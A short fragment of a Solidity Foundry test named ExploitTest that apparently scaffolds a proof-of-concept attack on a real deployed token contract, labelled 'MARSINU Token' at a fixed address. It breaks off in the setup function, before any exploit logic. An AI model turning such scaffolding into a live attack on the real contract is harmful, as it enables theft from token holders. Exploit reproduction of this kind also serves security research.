contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = MARSINU(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "MARSINU Token");
        vm.label(attacker, "Attacker");

